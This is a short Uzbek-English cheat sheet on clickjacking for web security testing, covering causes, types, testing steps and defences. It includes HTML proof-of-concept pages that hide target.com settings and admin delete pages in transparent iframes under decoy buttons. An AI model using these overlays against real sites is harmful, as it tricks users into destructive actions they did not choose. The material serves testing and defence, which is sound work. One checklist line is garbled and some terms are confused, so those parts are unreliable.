# Clickjacking (UI Redress)

## 1. Ta'rif
Clickjacking — attacker sayt transparent iframe'ga saytni joylashtirib, foydalanuvchi "click"larini kerakli action'ga yo'naltirishi mumkin. X-Frame-Options / CSP frame-ancestors yo'q bo'lsa. Impact: state-changing action (sharing concurrency), CSRF bilan yonma-yon, admin action.

## 2. Qayerdan kelib chiqadi
- `X-Frame-Options: DENY/SAMEORIGIN` header yo'q
- `Content-Security-Policy: frame-ancestors` yo'q
- Iframe'da sayt ochiladi (frameable)
- CSRF token bo'lsa ham — clickjacking mustaqil (browser frame)
- "double-click" CSRF yo'li (click-farmed)

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Basic clickjacking | transparent overlay |
| Nested/stacked | multi-layer |
| CSRF-like | action tampering |
| Login CSRF | clickjacking = attestation |
| Form jacking | user input manipulation (hidden form prefill) |

## 4. Metodologiya
1. Response headerlarni tekshiring:
   - `X-Frame-Options` / `frame-ancestors` yo'q bo'lsa — frameable.
   - HTML'da `<meta http-equiv=...>` emas (server header muhim).
2. O'zingizda iframe'da ochib test:
   ```html
   <iframe src="https://target.com/settings" width="100%" height="600"></iframe>
   ```
   - Agar content ko'rinsa → frameable.
3. Burp da response header yoki curl:
   ```
   curl -I https://target.com/settings
   ```
4. Impact — nima kliklash mumkin:
   - "Share", "Like", "Delete", "Submit review", "Execute admin action"
5. PoC:
   ```html
   <style>
     #victim { position: relative; width: 100%; height: 640px; opacity: 0.0001;
               z-index: 2; }
     #deco  { position: absolute; z-index: 1; }
   </style>
   <div id=deco><button style="margin-top:300px;font-size:40px">Klik</button></div>
   <iframe id=victim src="https://target.com/settings/delete"></iframe>
   ```
6. Login CSRF: iframe login page'da, bitta click login.

## 5. PoC
```html
<!DOCTYPE html>
<html>
<head><title>Clickjack</title></head>
<body>
<p>Boshqa narsa... (transparent)</p>
<div style="position:absolute;top:0;left:0;">
  <iframe src="https://target.com/admin/user/delete/1" style="opacity:0.0;
    width:700px; height:500px;"></iframe>
</div>
</body>
</html>
```
## 6. Request misollari
```
GET /settings HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
# ... X-Frame-Options yoki CSP frame-ancestors header YO'Q → vulnerable
```
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] Har bir action page header: X-Frame-Options, CSP
- [ ] Security flag; 3-part redirect page'lar ham frameable bo'ladi
- [ ] Login/form page'lar — login CSRF
- [ ] Double-click — bitta task 2 action
- [ ] Internal/apps (iframe'd broad section)
- [ ] Ifradyga e ya'ni criterion safe haqida yo'q degani emas — boshqa header'inning keber — CSP frame-ancestors bor bo'lsa to'g'ri sozmalgan
- [ ] `sandbox` attribute iframe'da — browser sandbox etsa even so frame may work
## 8. Himoya
- `X-Frame-Options: DENY` (legacy)
- `Content-Security-Policy: frame-ancestors 'none'` (yoki exact origin)
- Framebust blocks, click protections (login independent)
- Never trust frame - token plus frame-bust on state-change